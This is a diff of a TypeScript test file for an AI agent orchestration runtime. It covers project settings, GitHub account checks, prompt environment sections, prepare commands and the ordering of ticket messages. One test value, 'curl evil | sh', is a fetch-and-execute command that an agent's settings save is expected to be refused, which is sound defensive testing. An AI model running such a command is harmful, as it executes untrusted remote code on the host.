-    for (const change of [{ prepare: 'curl evil | sh' }, { blockedCommands: ['gh-other'] }, { directory: '/tmp/elsewhere' }]) await expect(save(change, origin)).rejects.toThrow('can only be changed in the management panel')
+    for (const change of [{ ...projects()[0]!, prepare: 'curl evil | sh' }, { ...projects()[0]!, directory: '/tmp/elsewhere' },
+      { ...projects()[0]!, repository: 'acme/other' }, { ...projects()[0]!, chats: [{ chatId: 'oc_other' }] }]) {
+      await expect(saveProjects([change], origin)).rejects.toThrow('Projects (repository, chats, ticket directory, prepare command) can only be changed in the management panel')
+    }
+    const saveBlocked = (blockedCommands: string[]) => runtime.settings.save('executor',
+      { ...runtime.store.settings().executor, blockedCommands }, runtime.store.blockRevision('executor'), origin)
+    await expect(saveBlocked(['gh-other'])).rejects.toThrow('The execution environment (blocked commands) can only be changed in the management panel')
+    expect(await runtime.settings.save('executor', { ...runtime.store.settings().executor, maxWorkers: origin === 'tool' ? 2 : 3 },
+      runtime.store.blockRevision('executor'), origin)).toMatchObject({ saved: true })
   }
-  expect(await save({ maxWorkers: 2 }, 'tool')).toMatchObject({ saved: true })
-  expect(await save({ prepare: 'true' }, 'panel')).toMatchObject({ saved: true })
+  expect(await saveProjects([{ ...projects()[0]!, prepare: 'true' }], 'panel')).toMatchObject({ saved: true, restarting: false })
+  expect(await saveProjects([{ ...projects()[0]!, repository: 'acme/gadgets' }], 'panel'))
+    .toMatchObject({ saved: true, restarting: true })
   expectTypeOf(runtime.settings.save).parameter(3).toEqualTypeOf<SettingsOrigin>()
   expectTypeOf(runtime.settings.pause).parameter(1).toEqualTypeOf<SettingsOrigin>()
 })
@@ -891,22 +946,34 @@ it('checks a changed account CLI before saving it, restarts after the save, and 
   const save = (config: Record<string, unknown>, origin: SettingsOrigin = 'panel') => runtime.settings.save('source:github',
     { enabled: true, config: { ...runtime.store.settings().sources.github!.config, ...config } }, runtime.store.blockRevision('source:github'), origin)
   await expect(save({ cli: OTHER }, 'tool')).rejects.toThrow('can only be changed in the management panel')
-  answer(OTHER, 'api repos/acme/widgets --jq {name: .full_name, push: .permissions.push}', '{"name":"acme/widgets","push":false}\n')
-  await expect(save({ cli: OTHER })).rejects.toMatchObject({ code: 'repositoryReadOnly', values: { account: 'agent-bot' } })
+  // A CLI that reports no account refuses the save; one that cannot push to a project repository saves, and setup
+  // reports the repository after the restart.
+  answer(OTHER, 'api user', 'signed out\n')
+  await expect(save({ cli: OTHER })).rejects.toMatchObject({ code: 'agentCliNoAccount' })
   expect(restarts).not.toHaveBeenCalled()
-  answer(OTHER, 'api repos/acme/widgets --jq {name: .full_name, push: .permissions.push}', '{"name":"acme/widgets","push":true}\n')
+  answer(OTHER, 'api user', '{"login":"agent-bot","id":7}')
+  answer(OTHER, 'api repos/acme/widgets --jq {name: .full_name, push: .permissions.push}', '{"name":"acme/widgets","push":false}\n')
   expect(await save({ cli: OTHER })).toMatchObject({ saved: true, restarting: true })
   await vi.waitFor(() => expect(restarts).toHaveBeenCalledTimes(1))
+  const failed = await restart({}, { github: { cli: OTHER } })
+  await failed.ready
+  expect(failed.setupProblem).toMatchObject({ place: 'projects', code: 'repositoryReadOnly',
+    values: { project: 'widgets', account: 'agent-bot', repository: 'acme/widgets' } })
+  answer(OTHER, 'api repos/acme/widgets --jq {name: .full_name, push: .permissions.push}', '{"name":"acme/widgets","push":true}\n')
+  const healthy = await restart()
+  await healthy.ready
+  expect(healthy.configured()).toBe(true)
+  expect(healthy.deployment.projects).toEqual([{ id: 'widgets', repository: 'acme/widgets' }])
   // Other fields of the Source take effect without a restart.
   expect(await save({ pollSeconds: 120 })).toMatchObject({ saved: true, restarting: false })
   expect(restarts).toHaveBeenCalledTimes(1)
-  expect((await runtime.settings.save('executor', { ...runtime.store.settings().executor, prepare: 'true' }, runtime.store.blockRevision('executor'), 'panel')).restarting).toBe(false)
+  expect((await runtime.settings.save('executor', { ...runtime.store.settings().executor, maxWorkers: 2 }, runtime.store.blockRevision('executor'), 'panel')).restarting).toBe(false)
   // A save of another block during the account check is kept: the check runs first, then the save merges.
-  const pending = save({ cli: AGENT })
+  const pending = save({ cli: OTHER })
   await runtime.settings.save('policy', { ...runtime.store.settings().policy, rules: [] }, runtime.store.blockRevision('policy'), 'panel')
   await pending
   expect(runtime.store.settings().policy.rules).toEqual([])
-  expect(runtime.store.settings().sources.github!.config).toMatchObject({ cli: AGENT })
+  expect(runtime.store.settings().sources.github!.config).toMatchObject({ cli: OTHER })
   const feishuSave = (cli: string) => runtime.settings.save('source:feishu', { enabled: true, config: { ...runtime.store.settings().sources.feishu!.config, cli } },
     runtime.store.blockRevision('source:feishu'), 'panel')
   expect(await feishuSave('')).toMatchObject({ restarting: true })
@@ -1001,15 +1068,18 @@ it('tells both roles the execution environment through a generated prompt sectio
   const preview = runtime.prompts.preview(runtime.prompts.current().config)
   const section = preview.parts.worker.at(-1)!
   expect(section.name).toBe('runtime/environment')
-  for (const line of ['- OMP_SUPERAGENT_GITHUB_REPOSITORY = "acme/widgets"', '- OMP_SUPERAGENT_GITHUB_ACCOUNT = "agent-bot"', '- OMP_SUPERAGENT_GITHUB_COMMIT_EMAIL = "7+agent-bot@users.noreply.github.com"']) expect(section.text).toContain(line)
+  for (const line of ['- OMP_SUPERAGENT_GITHUB_REPOSITORY = ""', '- OMP_SUPERAGENT_GITHUB_ACCOUNT = "agent-bot"', '- OMP_SUPERAGENT_GITHUB_COMMIT_EMAIL = "7+agent-bot@users.noreply.github.com"']) expect(section.text).toContain(line)
   expect(section.text).not.toContain('MERGE_ACCOUNT')
-  // Outside a ticket there is no ticket directory.
+  // Outside a ticket there is no ticket directory or project.
   expect(section.text).not.toContain('OMP_SUPERAGENT_DIR')
-  // The main Session's Policy section follows it.
-  expect(preview.orchestrator).toContain(`${section.text}\n\n## Policy`)
+  expect(section.text).not.toContain('OMP_SUPERAGENT_PROJECT')
+  // The main Session's Projects and Policy sections follow it.
+  expect(preview.orchestrator).toContain(`${section.text}\n\nProjects.`)
   const { ticket, sessionId } = await acceptedTicket()
   const promptFile = (id: string): string => readFileSync(join(directory, 'prompts', `${id}.r${runtime.prompts.current().revision}.md`), 'utf8')
   expect(promptFile(sessionId)).toContain(`- OMP_SUPERAGENT_DIR = ${JSON.stringify(ticket.execution!.directory)}`)
+  expect(promptFile(sessionId)).toContain('- OMP_SUPERAGENT_PROJECT = "widgets"')
+  expect(promptFile(sessionId)).toContain('- OMP_SUPERAGENT_GITHUB_REPOSITORY = "acme/widgets"')
   expect(promptFile(runtime.masterId)).not.toContain('OMP_SUPERAGENT_DIR')
   const next = await restart({}, { feishu: null })
   await next.ready
@@ -1064,16 +1134,17 @@ it('leaves auto-merge to the delivery requirements, with the agent\'s own gh and
   expect(runtime.prompts.preview(runtime.prompts.current().config).worker).not.toContain('gh-merge')
 })
 
-it('runs the prepare command once for a new ticket, under the execution root with the ticket\'s environment, and fails the ticket with its output', async () => {
-  const prepare = (command: string) => runtime.store.saveSettings({ ...runtime.store.settings(), executor: { ...runtime.store.settings().executor, prepare: command } })
+it('runs the prepare command once for a new ticket, under the project work root with the ticket\'s environment, and fails the ticket with its output', async () => {
+  const prepare = (command: string) => runtime.store.saveSettings({ ...runtime.store.settings(),
+    projects: runtime.store.settings().projects.map(project => ({ ...project, prepare: command })) })
   const marker = join(directory, 'prepare.env')
   prepare(`pwd > '${marker}.cwd' && env > '${marker}'`)
   const { ticket } = await acceptedTicket()
   const env = Object.fromEntries(readFileSync(marker, 'utf8').split('\n').filter(line => line.includes('='))
     .map(line => { const at = line.indexOf('='); return [line.slice(0, at), line.slice(at + 1)] }))
-  expect(realpathSync(readFileSync(`${marker}.cwd`, 'utf8').trim())).toBe(realpathSync(join(directory, 'work')))
+  expect(realpathSync(readFileSync(`${marker}.cwd`, 'utf8').trim())).toBe(realpathSync(join(directory, 'work', 'widgets')))
   expect(env).toMatchObject({ OMP_SUPERAGENT_DIR: ticket.execution!.directory, OMP_SUPERAGENT_NAME: ticket.execution!.name,
-    OMP_SUPERAGENT_GITHUB_REPOSITORY: 'acme/widgets', OMP_SUPERAGENT_FEISHU_CHAT: CHAT })
+    OMP_SUPERAGENT_PROJECT: 'widgets', OMP_SUPERAGENT_GITHUB_REPOSITORY: 'acme/widgets', OMP_SUPERAGENT_FEISHU_CHAT: CHAT })
   // A retry reuses the prepared directory.
   await runTool(`worker-${ticket.id}`, 'orchestrator_report', { state: 'failed', summary: 'offline' })
   rmSync(marker); rmSync(`${marker}.cwd`)
@@ -1094,7 +1165,8 @@ it('counts a ticket whose directory the host prepared before prepare commands ex
   const stored = runtime.store.tickets.get(ticket.id)!
   runtime.store.tickets.save({ ...stored, execution: { ...stored.execution!, directory } })
   const marker = join(directory, 'prepare-ran')
-  runtime.store.saveSettings({ ...runtime.store.settings(), executor: { ...runtime.store.settings().executor, prepare: `touch '${marker}'` } })
+  runtime.store.saveSettings({ ...runtime.store.settings(),
+    projects: runtime.store.settings().projects.map(project => ({ ...project, prepare: `touch '${marker}'` })) })
   await runtime.engine.retryTicket(ticket.id)
   await runtime.idle()
   expect(existsSync(marker)).toBe(false)
@@ -1174,7 +1246,7 @@ describe('the order of a Ticket\'s messages to one conversation', () => {
     runtime.outbox.send(message('result-a', 'a'))
     // Another Ticket in the same chat, and the same Ticket in an Issue, are other orders.
     runtime.outbox.send(message('ack-b', 'b', feishuChannel(CHAT, 'om_2')))
-    runtime.outbox.send(message('issue-a', 'a', githubChannel(7)))
+    runtime.outbox.send(message('issue-a', 'a', githubChannel('acme/widgets', 7)))
     await runtime.sendReplies()
     expect([runtime.outbox.status('result-a'), sent]).toEqual(['pending', ['ack-b', 'issue-a']])
     await at(5000)
@@ -1324,8 +1396,8 @@ it('records a report, the PR it binds and its relay together, or none of them', 
 })
 
 it('tells the main Session of each requeue of the same Trigger', async () => {
-  const stranger = commentTrigger({ id: 4, body: 'still wrong', user: { login: 'someone' }, html_url: 'https://github.com/acme/widgets/pull/8#issuecomment-4', created_at: '2026-09-09T00:00:00Z' },
-    { number: 8, isPr: true, url: 'https://github.com/acme/widgets/pull/8' }, 'conversation', 'agent-bot')
+  const stranger = commentTrigger('acme/widgets', { id: 4, body: 'still wrong', user: { login: 'someone' }, html_url: 'https://github.com/acme/widgets/pull/8#issuecomment-4', created_at: '2026-09-09T00:00:00Z' },
+    { repository: 'acme/widgets', number: 8, isPr: true, url: 'https://github.com/acme/widgets/pull/8' }, 'conversation', 'agent-bot')
   await receive(stranger)
   const requeued = () => deliveries.filter(call => call.sessionId === runtime.masterId && call.mode === 'inject'
     && call.text.includes('trigger_requeued')).length
@@ -1402,11 +1474,11 @@ it('tells the conversation that the PR merged when work a restart recovered ends
   await runtime.idle()
   expect(runtime.store.tickets.get(ticket.id)!.assignments).toHaveLength(2)
   // The PR merged before the restart; the recovered work goes on, and nothing is said yet.
-  const merged = { number: 42, state: 'closed', merged: true, merged_at: before.assignments[0]!.createdAt, html_url: 'https://github.com/acme/widgets/pull/42',
+  const merged = { repository: 'acme/widgets', number: 42, state: 'closed', merged: true, merged_at: before.assignments[0]!.createdAt, html_url: 'https://github.com/acme/widgets/pull/42',
     user: { login: 'agent-bot' }, head: { sha: 'abc', ref: 'agent/x', repo: { full_name: 'acme/widgets' } } }
-  await observePull(runtime.context(githubKind), merged)
+  await observePull(runtime.context(githubKind), merged as never)
   expect(runtime.store.tickets.get(ticket.id)).not.toHaveProperty('ended')
-  const id = key('pr-terminal', '42', 'feishu', JSON.stringify({ chatId: CHAT, messageId: 'om_1' }), 'merged')
+  const id = key('pr-terminal', 'acme/widgets', '42', 'feishu', JSON.stringify({ chatId: CHAT, messageId: 'om_1' }), 'merged')
   expect(runtime.store.replyStatus(id)).toBeUndefined()
   // Its ready report ends the ticket with the PR, and the conversation hears of the merge once.
   await runTool(sessionId, 'orchestrator_report', { state: 'ready', summary: 'Recovered and verified' })
@@ -1499,15 +1571,17 @@ it('runs a launch that fails for a passing reason again on the launch backoff th
   // A prepare command whose output names a passing failure is not run again on its own.
   const marker = join(directory, 'prepare.count')
   const runs = () => existsSync(marker) ? Number(readFileSync(marker, 'utf8')) : 0
-  runtime.store.saveSettings({ ...runtime.store.settings(), executor: { ...runtime.store.settings().executor,
-    prepare: `n=$(cat '${marker}' 2>/dev/null || echo 0); echo $((n + 1)) > '${marker}'; echo 'fatal: unable to access: The requested URL returned error: 503' >&2; exit 3` } })
+  runtime.store.saveSettings({ ...runtime.store.settings(),
+    projects: runtime.store.settings().projects.map(project => ({ ...project,
+      prepare: `n=$(cat '${marker}' 2>/dev/null || echo 0); echo $((n + 1)) > '${marker}'; echo 'fatal: unable to access: The requested URL returned error: 503' >&2; exit 3` })) })
   const before = runs()
   const prepared = await acceptedTicket(feishu('40', '@bot 修 prepare', { root_id: undefined }))
   await runtime.idle()
   expect(runtime.store.tickets.get(prepared.ticket.id)!.assignments.at(-1)!.report).toMatchObject({ state: 'failed', summary: expect.stringContaining('503') })
   expect(runs()).toBe(before + 1)
   // A retry runs the prepare command again, for the directory it left empty was removed; resuming relaunches no failed launch.
-  runtime.store.saveSettings({ ...runtime.store.settings(), executor: { ...runtime.store.settings().executor, prepare: `n=$(cat '${marker}' 2>/dev/null || echo 0); echo $((n + 1)) > '${marker}'; true` } })
+  runtime.store.saveSettings({ ...runtime.store.settings(),
+    projects: runtime.store.settings().projects.map(project => ({ ...project, prepare: `n=$(cat '${marker}' 2>/dev/null || echo 0); echo $((n + 1)) > '${marker}'; true` })) })
   runtime.executor.resume()
   await runtime.idle()
   expect(runs()).toBe(before + 1)
@@ -1518,12 +1592,14 @@ it('runs a launch that fails for a passing reason again on the launch backoff th
 })
 
 it('launches a queued Assignment once when the host resumes, and gives a failed launch\'s slot back', async () => {
-  runtime.store.saveSettings({ ...runtime.store.settings(), executor: { ...runtime.store.settings().executor, maxWorkers: 1, prepare: 'echo fatal: no such clone >&2; exit 3' } })
+  runtime.store.saveSettings({ ...runtime.store.settings(), executor: { ...runtime.store.settings().executor, maxWorkers: 1 },
+    projects: runtime.store.settings().projects.map(project => ({ ...project, prepare: 'echo fatal: no such clone >&2; exit 3' })) })
   const failed = await acceptedTicket(feishu('50', '@bot 修 一', { root_id: undefined }))
   await runtime.idle()
   expect(runtime.store.tickets.get(failed.ticket.id)!.assignments.at(-1)!.report).toMatchObject({ state: 'failed' })
   // The failed launch holds no slot: the next ticket launches in the only one.
-  runtime.store.saveSettings({ ...runtime.store.settings(), executor: { ...runtime.store.settings().executor, prepare: '' } })
+  runtime.store.saveSettings({ ...runtime.store.settings(),
+    projects: runtime.store.settings().projects.map(project => ({ ...project, prepare: '' })) })
   const next = await acceptedTicket(feishu('51', '@bot 修 二', { root_id: undefined }))
   await runtime.idle()
   expect(runtime.store.tickets.get(next.ticket.id)!.assignments.at(-1)).toMatchObject({ state: 'running' })
